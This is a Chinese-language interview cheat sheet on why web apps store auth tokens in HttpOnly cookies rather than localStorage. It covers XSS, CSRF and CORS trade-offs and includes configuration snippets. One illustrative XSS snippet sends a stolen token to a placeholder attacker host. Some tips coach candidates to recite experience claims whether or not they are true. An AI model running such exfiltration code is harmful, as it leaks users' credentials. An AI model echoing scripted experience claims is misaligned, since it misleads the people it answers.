# Cookie 认证 - 面试速记版 ⚡

## 🎯 核心回答（30秒版本）

**"为什么用 HttpOnly Cookie 而不是 localStorage？"**

> "主要是**安全性**。HttpOnly Cookie 无法被 JavaScript 读取，可以防止 XSS 攻击窃取 Token。localStorage 虽然简单，但完全暴露给 JS，一旦网站存在 XSS 漏洞，攻击者就能轻易窃取用户认证信息。这也是飞书、钉钉等大厂的标准做法。"

---

## 📊 对比记忆表

| 维度 | localStorage | HttpOnly Cookie | 结论 |
|------|-------------|-----------------|------|
| **XSS 防护** | ❌ 无 | ✅ 有 | **Cookie 胜** |
| **CSRF 防护** | ✅ 天然 | ⚠️ 需配置 | localStorage 略胜 |
| **自动发送** | ❌ 手动 | ✅ 自动 | **Cookie 胜** |
| **容量** | 5-10MB | 4KB | localStorage 胜 |
| **行业标准** | 不推荐 | ✅ 推荐 | **Cookie 胜** |

**结论：安全性 > 便利性，选 Cookie！**

---

## 🔐 三个关键点（必说）

### 1. XSS 攻击场景

```javascript
// ❌ localStorage - 危险！
<script>
  // 恶意代码轻松窃取
  const token = localStorage.getItem('token');
  fetch('http://hacker.com/steal?t=' + token);
</script>

// ✅ Cookie - 安全！
<script>
  document.cookie; // 读不到 HttpOnly 的 token！
</script>
```

### 2. 代码更简洁

```typescript
// ❌ localStorage - 需要拦截器
axios.interceptors.request.use(config => {
  config.headers.Authorization = `Bearer ${localStorage.getItem('token')}`;
  return config;
});

// ✅ Cookie - 浏览器自动携带
axios.create({ 
  withCredentials: true // 一行搞定！
});
```

### 3. 行业标准

> "飞书、钉钉、GitHub、Google 都用 HttpOnly Cookie"

---

## 🎤 常见追问 & 快速回答

### Q1: Cookie 不怕 CSRF 吗？

**A:** "确实需要防 CSRF，但比 XSS 好防：
1. SameSite 属性（浏览器默认开启）
2. CSRF Token
3. 验证 Origin/Referer

而 XSS 一旦发生，localStorage 直接裸奔。"

### Q2: Cookie 只有 4KB 够吗？

**A:** "JWT Token 通常 200-300 字节，够用！
- Token 只存：用户ID、角色、过期时间
- 其他数据：localStorage（非敏感）或服务端（敏感）"

### Q3: 用户禁用 Cookie 怎么办？

**A:** "现实中 < 1% 用户禁用，且禁用后大部分网站都登录不了。
企业应用（如管理后台）强制要求启用 Cookie 是合理的。"

---

## 💻 核心代码（背下来）

### 后端设置 Cookie

```go
// 登录时
c.SetCookie(
    "token",           // name
    token,             // value
    3600 * 24 * 7,     // 7天过期
    "/",               // 全站可用
    "",                // 当前域
    true,              // secure: 仅HTTPS
    true,              // httpOnly: 防JS读取 ⭐核心
)
```

### 前端配置

```typescript
// Axios
axios.create({
  withCredentials: true, // 允许携带 Cookie ⭐核心
});

// CORS 后端配置
c.Header("Access-Control-Allow-Credentials", "true") // ⭐核心
c.Header("Access-Control-Allow-Origin", origin) // 不能用 "*"
```

---

## 🎯 回答模板（直接背）

### 开场（10秒）

> "我们用 **HttpOnly Cookie**，主要是**防止 XSS 攻击**。它无法被 JavaScript 读取，即使网站有漏洞，攻击者也偷不走 Token。"

### 展开（30秒）

> "对比 localStorage：
> 1. **安全性**：localStorage 完全暴露给 JS，XSS 攻击时直接泄露
> 2. **自动化**：Cookie 浏览器自动携带，代码更简洁
> 3. **标准化**：飞书、钉钉等大厂都用这个方案
> 
> 虽然需要配置 CORS 和防 CSRF，但这些是标准操作，远比防 XSS 容易。"

### 升华（20秒）

> "安全永远是第一位的。OWASP 也建议敏感信息用 HttpOnly Cookie。我们实践中，这个方案不仅提升了安全性，还简化了代码，降低了维护成本。"

---

## 🚀 加分技巧

### 1. 主动提及标准

- "根据 **OWASP** 建议..."
- "符合 **GDPR** 数据保护要求..."
- "参考 **RFC 6265** HTTP Cookie 标准..."

### 2. 展示实战经验

- "我们项目迁移后，安全审计通过率提升..."
- "遇到过 CSRF 问题，通过 SameSite 解决..."
- "配合安全团队做了渗透测试..."

### 3. 承认权衡

- "没有完美方案，Cookie 也有 CSRF 风险"
- "需要根据场景选择，静态站点可以用 localStorage"
- "移动端 App 有更适合的安全存储方案"

---

## ⚠️ 避坑指南

### ❌ 不要说

- "localStorage 不安全"（太笼统）
- "Cookie 就是比 localStorage 好"（太绝对）
- "公司要求的"（没有思考）
- "不知道，没试过"（缺乏经验）

### ✅ 应该说

- "XSS 攻击时，localStorage 会泄露，Cookie 不会"（具体）
- "根据场景选择，我们项目更适合 Cookie"（灵活）
- "调研了大厂实践和安全标准后决定"（专业）
- "实际落地时遇到了 CORS 配置问题，后来解决了"（真实）

---

## 📈 不同级别的回答

### 初级（简洁）
> "HttpOnly Cookie 防 XSS，JavaScript 读不到，更安全。"

### 中级（专业）
> "Cookie 配合 HttpOnly 属性可以防止 XSS 窃取 Token，虽然需要处理 CORS 和 CSRF，但整体安全性比 localStorage 高很多，这也是行业标准做法。"

### 高级（深度）
> "认证方案选型需要权衡安全性、可维护性和用户体验。HttpOnly Cookie 提供深度防御，即使存在 XSS 漏洞也能保护认证信息。我们实践中配合 Token 刷新、审计日志等构建完整安全体系，符合 OWASP 最佳实践。"

---

## 🎓 最后提醒

### 面试三要素

1. **说清楚**：为什么选 Cookie（防 XSS）
2. **讲明白**：怎么实现的（HttpOnly + CORS）
3. **升华好**：行业标准、安全优先

### 黄金公式

```
安全场景 + 技术对比 + 实战经验 + 行业标准 = 满分回答
```

---

**祝面试顺利！记住：自信、具体、专业！** 💪
